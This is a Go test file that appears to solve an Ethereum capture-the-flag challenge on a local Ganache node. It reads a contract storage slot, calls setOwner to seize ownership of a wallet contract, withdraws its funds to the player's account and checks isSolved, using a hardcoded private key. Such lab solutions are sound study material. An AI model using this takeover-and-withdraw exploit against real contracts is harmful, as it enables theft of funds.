package ctf

import (
	"context"
	_ "embed"
	"encoding/json"
	"fmt"
	"github.com/stretchr/testify/require"
	"github.com/zerjioang/ctf/tinyeth"
	"testing"
)

const (
	ganacheUrl    = "http://127.0.0.1:8545"
	setupAddress  = "0x09CE6D88e0191eEb3fa5CD9ED5518ad46b3EBeCC"
	walletAddress = "0xe585809A9D52b6905ad014af286ac4B378d5a7d4"
)

var (
	//go:embed wallet.json
	walletContractAbiJson string
	//go:embed setup.json
	setupContractAbiJson string
)

func TestCTF1(t *testing.T) {
	t.Run("ctf1", func(t *testing.T) {
		t.Run("get-account-address-by-slot", func(t *testing.T) {
			// build rpc client
			var cl tinyeth.Client
			require.NoError(t, cl.Connect(ganacheUrl))
			// set target contract address
			targetContract := tinyeth.ParseAddress(setupAddress)
			require.NotNil(t, targetContract)
			// since we have contract source code, we can use its ABI
			targetAbi, err := cl.ParseAbi(walletContractAbiJson)
			require.NoError(t, err)
			require.NotNil(t, targetAbi)
			// send tx
			slotData, err := cl.GetStorageAt(
				context.TODO(),
				"0x09CE6D88e0191eEb3fa5CD9ED5518ad46b3EBeCC",
				"0x0",
			)
			require.NoError(t, err)
			slot, _ := PrettyStruct(slotData)
			fmt.Println("slot 0 of the contract contains the address of deployed wallet contract")
			fmt.Println(slot)
		})
		t.Run("get-wallet-contract-address", func(t *testing.T) {
			// build rpc client
			var cl tinyeth.Client
			require.NoError(t, cl.Connect(ganacheUrl))
			// use provided account details
			account, err := tinyeth.LoadAccount("60566eee170a8a0dd4a587f225d95f449dd3943d7a4ec1aa2d96eec2d58d9441")
			require.NoError(t, err)
			// set target contract address
			targetContract := tinyeth.ParseAddress(setupAddress)
			require.NotNil(t, targetContract)
			// since we have contract source code, we can use its ABI
			targetAbi, err := cl.ParseAbi(setupContractAbiJson)
			require.NoError(t, err)
			require.NotNil(t, targetAbi)
			// send tx
			data, txErr := cl.QueryBlockchain(
				context.TODO(),
				account,
				targetContract,
				&targetAbi,
				"wallet",
			)
			require.NoError(t, txErr)
			fmt.Println("wallet address:", data)
		})
		t.Run("set-owner", func(t *testing.T) {
			// build rpc client
			var cl tinyeth.Client
			require.NoError(t, cl.Connect(ganacheUrl))
			// use provided account details
			account, err := tinyeth.LoadAccount("60566eee170a8a0dd4a587f225d95f449dd3943d7a4ec1aa2d96eec2d58d9441")
			require.NoError(t, err)
			// set target contract address
			targetContract := tinyeth.ParseAddress(walletAddress)
			require.NotNil(t, targetContract)
			// since we have contract source code, we can use its ABI
			targetAbi, err := cl.ParseAbi(walletContractAbiJson)
			require.NoError(t, err)
			require.NotNil(t, targetAbi)
			// send tx
			txHash, txErr := cl.SendTransaction(
				context.TODO(),
				account,
				targetContract,
				&targetAbi,
				"setOwner",
			)
			require.NoError(t, txErr)
			fmt.Println("Transaction created with hash:", txHash)
			fmt.Println("Checking for tx receipt")
			receiptData, err := cl.TransactionReceipt(context.TODO(), txHash)
			require.NoError(t, err)
			receiptStr, _ := PrettyStruct(receiptData)
			fmt.Println(receiptStr)
		})
		t.Run("withdraw", func(t *testing.T) {
			// build rpc client
			var cl tinyeth.Client
			require.NoError(t, cl.Connect(ganacheUrl))
			// use provided account details
			account, err := tinyeth.LoadAccount("60566eee170a8a0dd4a587f225d95f449dd3943d7a4ec1aa2d96eec2d58d9441")
			require.NoError(t, err)
			// set target contract address
			targetContract := tinyeth.ParseAddress(walletAddress)
			require.NotNil(t, targetContract)
			// since we have contract source code, we can use its ABI
			targetAbi, err := cl.ParseAbi(walletContractAbiJson)
			require.NoError(t, err)
			require.NotNil(t, targetAbi)
			// send tx
			txHash, txErr := cl.SendTransaction(
				context.TODO(),
				account,
				targetContract,
				&targetAbi,
				"withdraw",
				account.Address,
			)
			require.NoError(t, txErr)
			fmt.Println("Transaction created with hash:", txHash)
			fmt.Println("Checking for tx receipt")
			receiptData, err := cl.TransactionReceipt(context.TODO(), txHash)
			require.NoError(t, err)
			receiptStr, _ := PrettyStruct(receiptData)
			fmt.Println(receiptStr)
		})
		t.Run("is-solved", func(t *testing.T) {
			// build rpc client
			var cl tinyeth.Client
			require.NoError(t, cl.Connect(ganacheUrl))
			// use provided account details
			account, err := tinyeth.LoadAccount("60566eee170a8a0dd4a587f225d95f449dd3943d7a4ec1aa2d96eec2d58d9441")
			require.NoError(t, err)
			// set target contract address
			targetContract := tinyeth.ParseAddress(setupAddress)
			require.NotNil(t, targetContract)
			// since we have contract source code, we can use its ABI
			targetAbi, err := cl.ParseAbi(setupContractAbiJson)
			require.NoError(t, err)
			require.NotNil(t, targetAbi)
			// send tx
			data, txErr := cl.QueryBlockchain(
				context.TODO(),
				account,
				targetContract,
				&targetAbi,
				"isSolved",
			)
			require.NoError(t, txErr)
			fmt.Println(data)
		})
	})
}

func PrettyStruct(data interface{}) (string, error) {
	val, err := json.MarshalIndent(data, "", "    ")
	if err != nil {
		return "", err
	}
	return string(val), nil
}
